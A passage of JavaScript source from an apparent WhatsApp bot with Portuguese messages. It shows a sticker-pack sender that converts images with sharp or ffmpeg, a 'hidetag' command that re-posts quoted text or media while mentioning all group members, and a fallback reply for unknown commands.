            const isImage = url.includes('.png') || url.includes('.jpg') || url.includes('.jpeg');

            if (isImage) {
                try {
                    const sharp = require('sharp');

                    buffer = await sharp(buffer)
                        .resize(512, 512, {
                            fit: 'contain',
                            background: { r: 0, g: 0, b: 0, alpha: 0 }
                        })
                        .webp()
                        .toBuffer();

                } catch (err) {
                    const tmpIn = `./tmp_pack_${crypto.randomBytes(4).toString('hex')}.png`;
                    const tmpOut = `./tmp_pack_${crypto.randomBytes(4).toString('hex')}.webp`;

                    fs.writeFileSync(tmpIn, buffer);

                    await new Promise((resolve, reject) => {
                        exec(
                            `ffmpeg -y -i "${tmpIn}" -vf "scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=0x00000000" "${tmpOut}"`,
                            err => err ? reject(err) : resolve()
                        );
                    });

                    buffer = fs.readFileSync(tmpOut);

                    if (fs.existsSync(tmpIn)) fs.unlinkSync(tmpIn);
                    if (fs.existsSync(tmpOut)) fs.unlinkSync(tmpOut);
                }
            }

            await conn.sendMessage(from, {
                sticker: buffer
            }, {
                quoted: info
            });

            enviados++;

            await new Promise(r => setTimeout(r, 1200));

        } catch (err) {
            console.log(`[PACK] Erro na figurinha ${i + 1}:`, err.message);
        }
    }

    await conn.sendMessage(from, {
        react: { text: '✅', key: info.key }
    });

    reply(`✅ Pack enviado!\n\n🎭 Nome: *${pack.name || firstPack.name || pesquisa}*\n📦 Enviadas: *${enviados}/${stickers.length}*`);

} catch (e) {
    console.log('[ERRO PACK]', e);
    await conn.sendMessage(from, {
        react: { text: '❌', key: info.key }
    });
    reply(`❌ Erro ao buscar pack:\n${e.message}`);
}
break;
}

//úteis

case 'totag':
case 'cita':
case 'hidetag': {
try {
    if (!isGroup) return reply("❌ Isso só pode ser usado em grupo.");

    await conn.sendMessage(from, {
        react: { text: '📢', key: info.key }
    });

    const groupMetadata = await conn.groupMetadata(from);
    const membros = groupMetadata.participants.map(v => v.id);

    const ctx = info.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = ctx?.quotedMessage;

    let mensagem = q || '';

    if (quotedMsg) {
        const type = Object.keys(quotedMsg)[0];

        if (type === 'conversation') {
            mensagem = quotedMsg.conversation;
        } else if (type === 'extendedTextMessage') {
            mensagem = quotedMsg.extendedTextMessage?.text || mensagem;
        } else if (type === 'imageMessage') {
            const buffer = await downloadMediaMessage(
                {
                    key: {
                        remoteJid: from,
                        id: ctx.stanzaId,
                        fromMe: false,
                        participant: ctx.participant
                    },
                    message: quotedMsg
                },
                'buffer',
                {},
                { logger: console }
            );

            return await conn.sendMessage(from, {
                image: buffer,
                caption: q || quotedMsg.imageMessage?.caption || '',
                mentions: membros
            }, { quoted: info });
        } else if (type === 'videoMessage') {
            const buffer = await downloadMediaMessage(
                {
                    key: {
                        remoteJid: from,
                        id: ctx.stanzaId,
                        fromMe: false,
                        participant: ctx.participant
                    },
                    message: quotedMsg
                },
                'buffer',
                {},
                { logger: console }
            );

            return await conn.sendMessage(from, {
                video: buffer,
                caption: q || quotedMsg.videoMessage?.caption || '',
                mentions: membros
            }, { quoted: info });
        } else if (type === 'audioMessage') {
            const buffer = await downloadMediaMessage(
                {
                    key: {
                        remoteJid: from,
                        id: ctx.stanzaId,
                        fromMe: false,
                        participant: ctx.participant
                    },
                    message: quotedMsg
                },
                'buffer',
                {},
                { logger: console }
            );

            return await conn.sendMessage(from, {
                audio: buffer,
                mimetype: 'audio/mpeg',
                ptt: quotedMsg.audioMessage?.ptt || false,
                mentions: membros
            }, { quoted: info });
        } else if (type === 'stickerMessage') {
            const buffer = await downloadMediaMessage(
                {
                    key: {
                        remoteJid: from,
                        id: ctx.stanzaId,
                        fromMe: false,
                        participant: ctx.participant
                    },
                    message: quotedMsg
                },
                'buffer',
                {},
                { logger: console }
            );

            return await conn.sendMessage(from, {
                sticker: buffer,
                mentions: membros
            }, { quoted: info });
        } else if (type === 'documentMessage') {
            const buffer = await downloadMediaMessage(
                {
                    key: {
                        remoteJid: from,
                        id: ctx.stanzaId,
                        fromMe: false,
                        participant: ctx.participant
                    },
                    message: quotedMsg
                },
                'buffer',
                {},
                { logger: console }
            );

            return await conn.sendMessage(from, {
                document: buffer,
                fileName: quotedMsg.documentMessage?.fileName || 'arquivo',
                mimetype: quotedMsg.documentMessage?.mimetype || 'application/octet-stream',
                caption: q || quotedMsg.documentMessage?.caption || '',
                mentions: membros
            }, { quoted: info });
        }
    }

    if (!mensagem) {
        mensagem = `📢 @${sender.split('@')[0]} chamou todos!`;
    }

    await conn.sendMessage(from, {
        text: mensagem,
        mentions: membros
    }, { quoted: info });

} catch (e) {
    console.log('[ERRO HIDETAG]', e);
    reply(`❌ Erro no hidetag:\n${e.message}`);
}
break;
}

default: {
await conn.sendMessage(from, {
text: `╭━━━〔 ❌ ERRO 〕━━━╮
┃
┃  *Comando não encontrado!*
┃
┃  bb O comando que você tentou usar
┃  não existe ou foi digitado errado.
┃
┃  🔎 Verifique o comando bb
┃
┃  📋 Clique abaixo para ver todos
┃  os comandos disponíveis.
┃
╰━━━━━━━━━━━━━━╯`,
footer: NomeBot,
buttons: [
{
buttonId: `${prefix}menu`,
buttonText: {
displayText: "📋 MENU"
},
type: 1
}
],
headerType: 1
}, { quoted: info });
}
break;

console.log("✅ VAI ENTRAR NO SWITCH:", command);

} // FECHA O SWITCH

} catch (e) {
console.log("Erro geral no index:", e);

if (String(e).includes(SHIZUKU_KEY)) {
console.log("A API caiu ou não foi possível executar esta ação.");
}

if (String(e).includes("aborted")) {
let file = require.resolve("./connect");
delete require.cache[file];
require(file);
}
}
};
